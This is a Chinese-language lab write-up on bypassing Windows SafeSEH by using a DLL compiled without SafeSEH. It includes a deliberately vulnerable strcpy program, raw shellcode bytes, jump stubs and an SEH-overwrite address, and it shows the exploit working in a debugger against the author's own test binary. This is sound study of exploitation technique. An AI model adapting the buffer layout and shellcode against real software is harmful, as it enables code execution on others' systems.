##   本例也是非常簡單，利用未開啟Safe SEH 的dll 就可以繞過。



###   實驗中遇到的問題，VC++ 6.0有時候會沒有 StdAfx.h

###  創建dll時 沒有遇到此問題


 ```
 // test.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    return TRUE;
}

void jump()
{
__asm{
	pop eax
	pop eax
	retn
	}
}
 ```

###   創建過程

### 1

![enter image description here](https://i.imgur.com/7cS4UCd.png)


### 2 
![enter image description here](https://i.imgur.com/k7Jjx8F.png)



###  3

![enter image description here](https://i.imgur.com/1lgu5j4.png)

###   4 完成後貼剩下的dll 程式碼

![enter image description here](https://i.imgur.com/GzgIJne.png)





###  創完後的dll 等等要丟到跟exe檔同一個目錄才能被調用，另外書上有教修改 ImageBase。



----



###   程式碼(本例有稍微修改一下，編譯時發現不通過，所以跟書上不太一樣)

```
// SEH_NoSafe_SEH.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <string.h>
#include <windows.h>
#include <stdio.h>




char shellcode[]=

"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
//168 bytes


"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
//padding for 200 bytes




"\xe9\x33\xFF\xFF\xFF"  // big_jmp 
"BBB"                   // padding for 8 bytes


"\xeb\xf6"              // short jmp 
"BB"					// padding for 4 bytes


"\xa2\x29\x13\x11";		//0x111329a2   # pop pop retn 





DWORD MyException(void)
{
	printf("There is an exception");
	getchar();
	return 1;
}
void test(char * input)
{
	char str[200];
	strcpy(str,input);	
    int zero=0;
	__try
	{
	    zero=1/zero;
	}
	__except(MyException())
	{
	}
}
int main(int argc, CHAR* argv[])
{
	HINSTANCE hInst = LoadLibrary(("test.dll"));//load No_SafeSEH module
	char str[200];
	//__asm int 3
	test(shellcode);
	return 0;
}
```
----
###   遇到的問題  stdafx.h 會找不到，這時按下 Alt + f7，並調整

![enter image description here](https://i.imgur.com/gnOJ1zN.png)







###   與書上不同的是，我們自行創建的dll檔中，我們使用了0x111329a2   # pop pop retn  。 但是會引發一個問題。


###  在 0x111329a2 這邊下斷點，發生異常按下shit + f9 執行handler

![enter image description here](https://i.imgur.com/fh48vNS.png)
---


###   執行完後跳回 next 然後往下找。發現 0x111329a2 被解釋成..
###   書上是往下走，但這裡不行。


![enter image description here](https://i.imgur.com/VXPcEHp.png)





###   所以我們只好往上跳，為了整齊好看，安排一個4 bytes 的小跳，然後再8 bytes 的大跳，大跳會跳到shellcode 起始位置。

### 小跳 2bytes    \xeb\xf6       +  BB ( padding )
### 大跳 8bytes    \xe9\x33\xFF\xFF\xFF   + BBB ( padding )

### 1
![enter image description here](https://i.imgur.com/DVujpJm.png)

### 2

![enter image description here](https://i.imgur.com/If9mcwH.png)


### 3  成功

![enter image description here](https://i.imgur.com/hkUIhqm.png)
